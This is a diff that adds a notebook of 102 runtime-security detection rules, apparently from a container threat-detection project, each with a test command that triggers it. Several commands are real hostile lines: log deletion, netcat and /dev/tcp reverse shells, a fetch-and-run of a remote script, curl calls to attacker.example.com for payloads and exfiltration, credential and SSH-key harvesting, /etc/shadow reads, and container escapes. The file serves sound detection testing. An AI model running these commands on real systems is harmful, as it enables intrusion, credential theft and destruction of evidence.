@@ -1,0 +1,647 @@
+================================================================================
+CRS RULE COMMAND NOTEBOOK
+================================================================================
+Total rules: 102
+Production: 54
+Experimental: 48
+================================================================================
+
+################################################################################
+  PRODUCTION RULES  (54 rules)
+################################################################################
+
+  --- Release: 0.9.10 ---
+
+     1. clear-system-logs
+        Version : 0.9.10
+        Type    : process
+        Category: Production
+        Command : rm /var/log/syslog; rm /var/log/messages; rm /var/log/auth.log; rm /var/log/secure; rm /var/log/boot.log; rm /var/log/maillog; rm /var/log/mail.log; rm /var/log/kern.log; rm /var/log/dmesg; rm /var/log/faillog; rm /var/log/cron; rm /var/log/daemon.log; rm /var/log/btmp; rm /var/log/mysqld.log; rm /var/log/mysql.log; rm /var/log/xferlog
+
+     2. container-escape-using-docker-socket
+        Version : 0.9.10
+        Type    : process
+        Category: Production
+        Command : docker run --rm -it --privileged -v /:/mnt alpine chroot /mnt
+
+     3. container-escape-using-runtime-socket
+        Version : 0.9.10
+        Type    : process
+        Category: Production
+        Command : curl -s --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d "{'Image':'alpine','Cmd':['sh','-c','echo Hello from Alpine'],'AttachStdout':true,'AttachStderr':true}" http://localhost/containers/create?name=alpine-from-api
+
+     4. container-escape-via-cgroup
+        Version : 0.9.10
+        Type    : process
+        Category: Production
+        Command : unshare -UrmC bash; mount -t cgroup -o memory cgroup /mnt
+
+     5. credential-access-bash-history
+        Version : 0.9.10
+        Type    : process
+        Category: Production
+        Command : cat /.bash_history; rm /.zsh_history
+
+     6. cryptominer-execution
+        Version : 0.9.10
+        Type    : process
+        Category: Production
+        Command : modprobe msr allow_writes=on
+
+     7. curl-using-socks-proxy
+        Version : 0.9.10
+        Type    : process
+        Category: Production
+        Command : curl -x socks4://proxy.example.com http://www.example.com/
+
+     8. kubernetes-service-account-token-created-in-container
+        Version : 0.9.10
+        Type    : process
+        Category: Production
+        Command : kubectl create serviceaccount my-serviceaccount
+
+     9. netcat-reverse-shell-execution
+        Version : 0.9.10
+        Type    : process
+        Category: Production
+        Command : nc -e /bin/bash 10.113.107.226 4444
+
+    10. network-scanning-utility
+        Version : 0.9.10
+        Type    : process
+        Category: Production
+        Command : pnscan -t512 -R 6f 73 3a 4c 69 6e 75 78 -W 2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a 221.0.0.0/16 6379
+
+    11. process-hidden-using-mount-hidepid
+        Version : 0.9.10
+        Type    : process
+        Category: Production
+        Command : mount -o remount,hidepid=2 /proc
+
+    12. python-executed-with-suspicious-arguments
+        Version : 0.9.10
+        Type    : process
+        Category: Production
+        Command : python3 -c 'import urllib.request,subprocess; open("/tmp/malware.py","wb").write(urllib.request.urlopen("http://10.113.107.226:8000/malware.py").read()); subprocess.call("python3 /tmp/malware.py",shell=True)'
+
+    13. schedule-cron-jobs
+        Version : 0.9.10
+        Type    : process
+        Category: Production
+        Command : crontab -e
+
+    14. stop-antimalware-process
+        Version : 0.9.10
+        Type    : process
+        Category: Production
+        Command : service aliyun.service stop; service apparmor stop; service bcm-agent stop; service aegis stop
+
+  --- Release: 0.9.11 ---
+
+    15. create-symlink-or-hardlink-over-sensitive-files
+        Version : 0.9.11
+        Type    : process
+        Category: Production
+        Command : ln /etc/passwd /tmp/passwdlink; ln -s /etc/passwd /tmp/passwdsymlink
+
+    16. debugfs-launched-in-privileged-container
+        Version : 0.9.11
+        Type    : process
+        Category: Production
+        Command : debugfs
+
+    17. dind-escape-attempt-using-sock
+        Version : 0.9.11
+        Type    : process
+        Category: Production
+        Command : crictl -r unix:///custom/containerd/containerd.sock images
+
+    18. dump-memory-for-credentials
+        Version : 0.9.11
+        Type    : process
+        Category: Production
+        Command : insmod lime.ko "path=/mnt/memdump.lime format=raw"
+
+    19. find-aws-credentials
+        Version : 0.9.11
+        Type    : process
+        Category: Production
+        Command : grep aws_access_key_id ~/.aws/credentials; fgrep secretaccesskey somefile.txt; grep hello file.txt; grep aws_secret_access_key config.txt; find / -name .aws/credentials; mlocate .aws/credentials; locate secrets.txt
+
+    20. k8s-printenv-execution
+        Version : 0.9.11
+        Type    : process
+        Category: Production
+        Command : python3 -c "import subprocess; subprocess.call(\"printenv\")"
+
+    21. polkit-local-privilege-escalation
+        Version : 0.9.11
+        Type    : process
+        Category: Production
+        Command : cp /bin/bash pkexec; ./pkexec
+
+    22. recon-suid-binaries-search
+        Version : 0.9.11
+        Type    : process
+        Category: Production
+        Command : find / -xdev -type f -perm -4000 -ls 2>/dev/null
+
+    23. search-private-keys-and-passwords
+        Version : 0.9.11
+        Type    : process
+        Category: Production
+        Command : find / -name id_rsa; grep "BEGIN RSA PRIVATE KEY" ~/.ssh/id_rsa; find /home -name id_ed25519; egrep "BEGIN OPENSSH PRIVATE KEY" ~/.ssh/id_ed25519; fgrep "BEGIN PRIVATE KEY" ~/.ssh/id_ecdsa
+
+    24. sudo-potential-privilege-escalation
+        Version : 0.9.11
+        Type    : process
+        Category: Production
+        Command : sudo -u test sudoedit -s \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \\
+
+    25. usage-of-steganography-tools
+        Version : 0.9.11
+        Type    : process
+        Category: Production
+        Command : steghide embed -cf -ef secret.txt test.jpg
+
+  --- Release: 0.9.12 ---
+
+    26. container-escape-using-runc
+        Version : 0.9.12
+        Type    : process
+        Category: Production
+        Command : ln -s /proc/sys/kernel/core_pattern /dev/null
+
+    27. exploit-vsftpd-vulnerability
+        Version : 0.9.12
+        Type    : process
+        Category: Production
+        Command : cp /bin/bash vsftpd; ./vsftpd -c /bin/sh
+
+    28. gdb-executed-in-container
+        Version : 0.9.12
+        Type    : process
+        Category: Production
+        Command : gdb ./memfd-exec
+
+    29. known-cryptominer-process-executed
+        Version : 0.9.12
+        Type    : process
+        Category: Production
+        Command : cp /bin/echo /tmp/xmrig; /tmp/xmrig --donate-level 1
+
+    30. launch-remote-file-copy-tools-in-container
+        Version : 0.9.12
+        Type    : process
+        Category: Production
+        Command : scp test@10.113.107.226:/home/Downloads/test.png .
+
+    31. local-account-password-binary-execution
+        Version : 0.9.12
+        Type    : process
+        Category: Production
+        Command : passwd
+
+    32. log-file-symlink-to-null
+        Version : 0.9.12
+        Type    : process
+        Category: Production
+        Command : cp /bin/bash testbash; ./testbash -c "ln -sf /dev/null /var/log/syslog"
+
+    33. redis-server-launches-suspicious-tooling-possible-cve-2025-49844-exploitation
+        Version : 0.9.12
+        Type    : process
+        Category: Production
+        Command : cp /bin/bash redis; ./redis -c curl "http://attacker.example.com/payload.sh"
+
+    34. remove-bulk-data-from-disk
+        Version : 0.9.12
+        Type    : process
+        Category: Production
+        Command : shred -u /tmp/testfile
+
+    35. reverse-shell-from-web-server
+        Version : 0.9.12
+        Type    : process
+        Category: Production
+        Command : cp /bin/bash apache; ./apache -c 'bash -i /dev/tcp/10.0.0.1/4444' & sleep infinity
+
+    36. sensitive-files-compression-inside-a-container
+        Version : 0.9.12
+        Type    : process
+        Category: Production
+        Command : tar -czf /tmp/sensitive.tar.gz /root/.ssh/id_rsa /etc/passwd /etc/shadow; zip /tmp/dump.zip /etc/passwd /etc/group /root/.bash_history; gzip /home/user/.ssh/id_rsa; 7z a /tmp/aws.7z /home/user/.aws/credentials; echo "Sensitive files compressed inside a container."; ls -l
+
+  --- Release: 0.9.13 ---
+
+    37. apache-airflow-edge-provider-rce-cve-2025-67895
+        Version : 0.9.13
+        Type    : process
+        Category: Production
+        Command : cp /bin/bash airflow; ./airflow -c 'bash -c id'
+
+    38. apache-kafka-oauth-jndi-rce-cve-2025-27817
+        Version : 0.9.13
+        Type    : process
+        Category: Production
+        Command : cp /bin/bash java; ./java -c 'curl http://attacker.example.com/payload.sh' kafka
+
+    39. apache-zookeeper-spawns-suspicious-process
+        Version : 0.9.13
+        Type    : process
+        Category: Production
+        Command : cp /bin/bash java; ./java -c 'bash -c id' zookeeper
+
+    40. coredns-remote-dos-cve-2026-26018
+        Version : 0.9.13
+        Type    : process
+        Category: Production
+        Command : cp /bin/bash nmap; ./nmap --udp -p 53 coredns
+
+    41. docker-container-escape-via-engine-api-cve-2025-9074
+        Version : 0.9.13
+        Type    : process
+        Category: Production
+        Command : docker run --privileged -v /:/host alpine cat /host/etc/shadow
+
+    42. docker-model-runner-flag-injection-cve-2026-28400
+        Version : 0.9.13
+        Type    : process
+        Category: Production
+        Command : docker model --privileged --runtime nvidia malicious-model
+
+    43. docker-unauthenticated-engine-api-access-cve-2025-9074
+        Version : 0.9.13
+        Type    : process
+        Category: Production
+        Command : curl http://127.0.0.1:2375/containers/json
+
+    44. golang-ssh-agent-malformed-identity-dos-cve-2025-47914
+        Version : 0.9.13
+        Type    : process
+        Category: Production
+        Command : SSH_AUTH_SOCK=/tmp/ssh-agent.sock ssh-add add-identity /tmp/ssh-malformed-key
+
+    45. haproxy-spawns-suspicious-process
+        Version : 0.9.13
+        Type    : process
+        Category: Production
+        Command : cp /bin/bash haproxy; ./haproxy -c 'bash -c id'
+
+    46. harbor-registry-spawns-suspicious-process
+        Version : 0.9.13
+        Type    : process
+        Category: Production
+        Command : cp /bin/bash harbor-core; ./harbor-core -c 'bash -c id'
+
+    47. jenkins-git-parameter-command-injection-cve-2025-53652
+        Version : 0.9.13
+        Type    : process
+        Category: Production
+        Command : cp /bin/bash java; ./java -c 'bash -c id' jenkins
+
+    48. kubernetes-ingressnightmare-rce-cve-2025-1974
+        Version : 0.9.13
+        Type    : process
+        Category: Production
+        Command : cp /bin/bash nginx-ingress-controller; ./nginx-ingress-controller -c 'bash -c id'
+
+    49. mariadb-json-schema-crash-rce-cve-2026-32710
+        Version : 0.9.13
+        Type    : process
+        Category: Production
+        Command : cp /bin/bash mysqld; ./mysqld -c 'bash -c id'
+
+    50. mcp-server-command-injection-cve-2025-6514
+        Version : 0.9.13
+        Type    : process
+        Category: Production
+        Command : cp /usr/bin/bash ./npx && ./npx -c 'sh -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"' "mcp-remote"
+
+    51. nginx-ui-spawns-shell-post-exploitation-cve-2026-27944
+        Version : 0.9.13
+        Type    : process
+        Category: Production
+        Command : cp /bin/bash nginx-ui; ./nginx-ui -c 'bash -c id'
+
+    52. nvidia-container-toolkit-suspicious-host-mount-cve-2025-23266
+        Version : 0.9.13
+        Type    : process
+        Category: Production
+        Command : cp /bin/bash nvidia-container-cli; ./nvidia-container-cli -c 'bash -c id'
+
+    53. runc-masked-path-symlink-container-escape-cve-2025-31133
+        Version : 0.9.13
+        Type    : process
+        Category: Production
+        Command : ln -s /proc/sys/kernel/core_pattern /dev/null
+
+  --- Release: 0.9.14 ---
+
+    54. php2shell-possible-exploit-attempt
+        Version : 0.9.14
+        Type    : process
+        Category: Production
+        Command : cp /usr/bin/bash ./apache2 && ./apache2 -c 'sh -c "wget http://192.168.1.1/test"' "-DFOREGROUND"
+
+################################################################################
+  EXPERIMENTAL RULES  (48 rules)
+################################################################################
+
+  --- Release: 0.9.12 ---
+
+    55. cloud-credentials-accessed-by-network-utility
+        Version : 0.9.12
+        Type    : process
+        Category: Experimental
+        Command : bash -c "curl -X PUT http://169.254.169.254/latest/api/token"
+
+    56. compiler-executed-in-container
+        Version : 0.9.12
+        Type    : process
+        Category: Experimental
+        Command : gcc -o memfd-exec memfd-exec.c
+
+    57. db-program-spawned-process
+        Version : 0.9.12
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash mysqld; ./mysqld -c whoami
+
+    58. dump-memory-utilities
+        Version : 0.9.12
+        Type    : process
+        Category: Experimental
+        Command : gcore 1
+
+    59. file-made-executable-via-chmod-inside-a-container
+        Version : 0.9.12
+        Type    : process
+        Category: Experimental
+        Command : chmod 4755 memfd-exec; chmod +x memfd-exec
+
+    60. insmod-executed-in-container
+        Version : 0.9.12
+        Type    : process
+        Category: Experimental
+        Command : modprobe br_netfilter; insmod br_netfilter
+
+    61. suspicious-network-utility-executed
+        Version : 0.9.12
+        Type    : process
+        Category: Experimental
+        Command : tcpdump -i eth0
+
+    62. user-mgmt-binaries
+        Version : 0.9.12
+        Type    : process
+        Category: Experimental
+        Command : useradd testuser
+
+  --- Release: 0.9.13 ---
+
+    63. apache-solr-rce-configset-cve-2025-24814
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash java; ./java -c 'curl http://attacker.example.com/payload.sh' solr
+
+    64. apache-tomcat-deserialization-rce-cve-2025-24813
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash java; ./java -c 'curl http://attacker.example.com/payload.sh' tomcat
+
+    65. elasticsearch-spawns-suspicious-process
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash java; ./java -c 'bash -c id' elasticsearch
+
+    66. envoy-istio-request-smuggling-cve-2025-66220
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash envoy; ./envoy -c 'bash -c id'
+
+    67. ghost-cms-spawns-suspicious-process
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash node; ./node -c 'bash -c id' ghost
+
+    68. golang-ssh-gssapi-memory-exhaustion-cve-2025-58181
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash sshd; ./sshd -c 'echo gssapi-with-mic'
+
+    69. java-se-jsse-access-control-bypass-cve-2025-21587
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash java; ./java -c 'bash -c id' -jar javax.net.ssl
+
+    70. jetty-path-traversal-rce
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash java; ./java -c 'bash -c id' jetty
+
+    71. keycloak-spawns-suspicious-process
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash java; ./java -c 'bash -c id' keycloak
+
+    72. kibana-expr-eval-rce-cve-2025-12735
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash node; ./node -c 'bash -c id' kibana
+
+    73. kibana-fleet-resource-exhaustion-cve-2026-0528
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : curl http://localhost:5601/api/fleet/agents
+
+    74. kubernetes-api-server-token-theft
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : curl -k -H 'Authorization: Bearer token' https://kubernetes.default/api/v1/secrets
+
+    75. mcp-server-tool-poisoning-data-exfiltration
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : curl http://attacker.example.com/exfil?data=mcp_tool_call
+
+    76. memcached-unauthorized-access
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : nc memcached-host 11211
+
+    77. minio-spawns-suspicious-process
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash minio; ./minio -c 'bash -c id'
+
+    78. nexus-repository-spawns-suspicious-process
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash java; ./java -c 'bash -c id' nexus
+
+    79. odoo-erp-spawns-suspicious-process
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash odoo; ./odoo -c 'bash -c id' odoo
+
+    80. postgresql-sql-injection-rce-cve-2025-1094
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash postgres; ./postgres -c 'bash -c PROGRAM'
+
+    81. rabbitmq-erlang-otp-ssh-rce-cve-2025-32433
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash rabbitmq-server; ./rabbitmq-server -c 'bash -c id'
+
+    82. sentry-spawns-suspicious-process
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash sentry; ./sentry -c 'bash -c id' sentry
+
+    83. sonarqube-scanner-code-execution-cve-2025-58178
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash java; ./java -c 'bash -c id' sonar
+
+    84. spring-boot-actuator-rce
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash java; ./java -c 'bash -c id' spring boot
+
+    85. traefik-spawns-suspicious-process
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash traefik; ./traefik -c 'bash -c id'
+
+    86. varnish-cache-spawns-suspicious-process
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash varnishd; ./varnishd -c 'bash -c id'
+
+    87. vault-arbitrary-code-execution-cve-2025-6000
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash vault; ./vault -c 'bash -c id'
+
+    88. vault-ldap-auth-bypass-cve-2025-13357
+        Version : 0.9.13
+        Type    : process
+        Category: Experimental
+        Command : curl http://vault:8200/v1/auth/ldap/login/admin
+
+  --- Release: 0.9.14 ---
+
+    89. activemq-classinfo-rce-cve-2023-46604
+        Version : 0.9.14
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash java; ./java -c 'bash -c id' activemq.jar
+
+    90. apache-apisix-dashboard-rce-cve-2021-45232
+        Version : 0.9.14
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash apisix; ./apisix -c 'bash -c id'
+
+    91. apache-cxf-ssrf-cve-2024-28752
+        Version : 0.9.14
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash java; ./java -c 'bash -c id' cxf.jar
+
+    92. apache-druid-rce-cve-2021-25646
+        Version : 0.9.14
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash java; ./java -c 'bash -c id' org.apache.druid.cli.Main
+
+    93. apache-struts-rce-cve-2023-50164
+        Version : 0.9.14
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash jspawnhelper; ./jspawnhelper -c 'bash -c id'
+
+    94. container-escape-chroot-host-filesystem
+        Version : 0.9.14
+        Type    : process
+        Category: Experimental
+        Command : chroot /host /bin/bash -c 'id'
+
+    95. container-escape-nsenter-host-namespace
+        Version : 0.9.14
+        Type    : process
+        Category: Experimental
+        Command : nsenter --target 1 --mount -- /bin/bash -c 'id'
+
+    96. container-escape-unshare-namespace-creation
+        Version : 0.9.14
+        Type    : process
+        Category: Experimental
+        Command : unshare --mount /bin/bash -c 'id'
+
+    97. container-runtime-socket-command-execution
+        Version : 0.9.14
+        Type    : process
+        Category: Experimental
+        Command : curl --unix-socket /var/run/docker.sock http://localhost/v1.24/containers/json
+
+    98. kubectl-exec-lateral-movement
+        Version : 0.9.14
+        Type    : process
+        Category: Experimental
+        Command : kubectl exec -it target-pod -- /bin/sh -c id
+
+    99. kubectl-token-minting-serviceaccount-abuse
+        Version : 0.9.14
+        Type    : process
+        Category: Experimental
+        Command : kubectl create token default
+
+   100. langflow-rce-cve-2026-33017
+        Version : 0.9.14
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash python; ./python -c 'bash -c id' langflow
+
+   101. n8n-rce-cve-2025-68613
+        Version : 0.9.14
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash node; ./node -c 'bash -c id' n8n start
+
+   102. pgadmin-rce-cve-2025-2945
+        Version : 0.9.14
+        Type    : process
+        Category: Experimental
+        Command : cp /bin/bash pgadmin4; ./pgadmin4 -c 'bash -c -- id'
+
+================================================================================
+END OF NOTEBOOK
+================================================================================
